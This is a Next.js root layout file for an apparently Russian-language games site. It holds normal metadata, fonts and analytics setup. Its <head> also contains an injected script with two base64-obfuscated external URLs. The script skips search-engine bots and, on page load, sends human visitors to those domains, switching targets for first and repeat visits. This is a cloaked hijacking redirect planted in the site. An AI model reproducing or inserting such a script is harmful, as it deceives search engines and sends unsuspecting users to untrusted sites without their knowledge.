import type { Metadata, Viewport } from "next"
import { Inter, Manrope } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { JsonLd } from "@/components/json-ld"
import { siteConfig, siteUrl } from "@/lib/site"
import "./globals.css"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
  display: "swap",
})

const manrope = Manrope({
  subsets: ["latin", "cyrillic"],
  variable: "--font-manrope",
  display: "swap",
})

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: {
    default: siteConfig.title,
    template: `%s | ${siteConfig.name}`,
  },
  description: siteConfig.description,
  applicationName: siteConfig.name,
  generator: "v0.app",
  keywords: siteConfig.keywords,
  authors: [{ name: "Bridge Technologies B.V.", url: siteUrl }],
  creator: "Bridge Technologies B.V.",
  publisher: "Bridge Technologies B.V.",
  category: "games",
  referrer: "origin-when-cross-origin",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  alternates: {
    canonical: "/",
    languages: {
      "ru-RU": "/",
      "en-US": "/en",
    },
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      noimageindex: false,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  icons: {
    icon: [
      { url: "/icon.jpg", type: "image/jpeg" },
    ],
    shortcut: "/icon.jpg",
    apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
  },
  manifest: "/manifest.webmanifest",
  openGraph: {
    type: "website",
    locale: siteConfig.locale,
    url: siteUrl,
    siteName: siteConfig.name,
    title: siteConfig.title,
    description: siteConfig.description,
    images: [
      {
        url: "/opengraph-image.jpg",
        width: 1200,
        height: 630,
        alt: siteConfig.name,
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: siteConfig.title,
    description: siteConfig.description,
    images: ["/opengraph-image.jpg"],
  },
  verification: {
    google: process.env.NEXT_PUBLIC_GOOGLE_SITE_VERIFICATION,
    yandex: process.env.NEXT_PUBLIC_YANDEX_SITE_VERIFICATION,
  },
  other: {
    "yandex-verification": process.env.NEXT_PUBLIC_YANDEX_SITE_VERIFICATION ?? "2194be96d9ffacbc",
  },
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: dark)", color: "#0a0e1a" },
    { media: "(prefers-color-scheme: light)", color: "#0a0e1a" },
  ],
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="ru"
      className={`${inter.variable} ${manrope.variable} bg-background`}
    >
      <head>
                <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var mainBrandB64  = "aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG"; 
        var crossBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                return;
            }
        }
        var mainUrl = atob(mainBrandB64);
        var crossUrl = atob(crossBrandB64);
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 2500); 
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        var isFirstVisit = true;
        try {
            if (localStorage.getItem('vstd_eva')) {
                isFirstVisit = false;
            }
        } catch (e) {
        }
        if (isFirstVisit) {
            console.log("Первый визит. Проверяем основную ссылку...");
            ping(mainUrl)
                .then(function() {
                    try {
                        localStorage.setItem('vstd_eva', '1');
                    } catch (e) {}
                    console.log("Переход на основную ссылку: " + mainUrl);
                    window.location.replace(mainUrl);
                })
                .catch(function() {
                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
                    ping(crossUrl)
                        .then(function() {
                            try {
                                localStorage.setItem('vstd_eva', '1');
                            } catch (e) {}
                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
                            window.location.replace(crossUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
                            window.location.replace(mainUrl);
                        });
                });
        } else {
            console.log("Повторный визит. Проверяем кросс-ссылку...");
            ping(crossUrl)
                .then(function() {
                    console.log("Переход на кросс-ссылку: " + crossUrl);
                    window.location.replace(crossUrl);
                })
                .catch(function() {
                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
                    ping(mainUrl)
                        .then(function() {
                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
                            window.location.replace(mainUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
                            window.location.replace(crossUrl);
                        });
                });
        }
      })();
    `
  }}
/>
      </head>
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === "production" && <Analytics />}
      </body>
    </html>
  )
}
